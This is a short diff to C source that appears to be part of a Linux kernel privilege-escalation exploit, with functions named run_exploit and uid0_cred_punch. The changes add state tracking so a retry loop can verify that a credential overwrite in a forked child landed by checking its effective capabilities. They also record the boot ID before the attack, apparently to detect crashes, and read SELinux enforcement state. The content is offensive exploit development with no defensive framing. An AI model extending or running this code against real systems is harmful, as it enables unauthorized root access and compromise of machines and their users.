@@ -2132,6 +2132,10 @@ uid0_cred_punch:;
     live_sync_log("UID0", "fork_fail");
     return 1;
   }
+  /* landing-checked retry: the route loop verifies each punch attempt via
+   * this child's CapEff (do_pselect_fake_lock_route MODE4_SLIDE_CRED) */
+  g_uid0_child_pid = (long)child;
+  g_uid0_cred_landed = 0;
 
   uintptr_t child_self = 0;
   if (read(pipes.task_r, &child_self, sizeof(child_self)) !=
@@ -2828,6 +2832,7 @@ int run_exploit(int argc, char **argv) {
     read_first_line("/proc/sys/kernel/random/boot_id", boot_before,
                     sizeof(boot_before));
     read_first_line("/sys/fs/selinux/enforce", enf_before, sizeof(enf_before));
+    memcpy(g_bootid_before, boot_before, sizeof(g_bootid_before));
 
     const char *tgt_name = getenv("WRITE_PROOF_TARGET");
     if (env_flag("MODE4_SLIDE_ZERO", 0)) {
